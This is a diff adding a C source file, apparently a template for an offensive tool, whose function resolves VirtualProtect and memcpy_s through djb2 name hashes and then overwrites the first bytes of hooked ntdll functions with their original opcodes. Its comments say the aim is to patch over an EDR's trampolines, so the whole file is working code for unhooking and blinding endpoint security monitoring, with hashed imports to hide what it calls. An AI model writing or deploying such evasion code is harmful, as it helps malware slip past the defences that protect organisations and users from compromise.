@@ -1,0 +1,46 @@
+#include "APIresolve.h"
+
+
+// int hashed_name;    djb2 hashed c string of the function name 
+// (function names are ANSI in the exports name table unlike like DLL names in ldr entries which are unicode)
+// unsigned char patch_bytes[8];   byte array of the original opcodes we are going to patch over the edr trampoline
+
+typedef struct {
+    int hashed_name;
+    unsigned char patch_bytes[8]; 
+} HookedFunction;
+
+uint64_t pathofsteel(void)
+{
+	HookedFunction functions[$num] = {$init_objs};
+
+    uint64_t virtualprotect_ptr = 0x00;
+	uint64_t hookedfunction_ptr = 0x00;
+	uint64_t memcpy_s_ptr = 0x00;
+	DWORD oldProtect = 0x00;
+	
+    int i;
+	for(i = 0; i<$num; i++)
+	{
+		virtualprotect_ptr = getFunctionPtr(HASH_kernel32, HASH_VirtualProtect);
+		if (virtualprotect_ptr == 0x00)
+		{
+			return 1;
+		}
+		hookedfunction_ptr = getFunctionPtr(HASH_ntdll, functions[i].hashed_name);
+		if (hookedfunction_ptr == 0x00)
+		{
+			return 1;
+		}
+		memcpy_s_ptr = getFunctionPtr(HASH_ntdll, HASH_memcpy_s);
+		if (memcpy_s_ptr == 0x00)
+		{
+			return 1;
+		}
+		((VIRTUALPROTECT)virtualprotect_ptr)(hookedfunction_ptr,sizeof(functions[i].patch_bytes),PAGE_EXECUTE_READWRITE,&oldProtect);
+		((MEMCPY_S)memcpy_s_ptr)(hookedfunction_ptr, sizeof(functions[i].patch_bytes),functions[i].patch_bytes,sizeof(functions[i].patch_bytes));
+		((VIRTUALPROTECT)virtualprotect_ptr)(hookedfunction_ptr,sizeof(functions[i].patch_bytes),oldProtect, NULL);
+	}
+
+	return 0;
+}
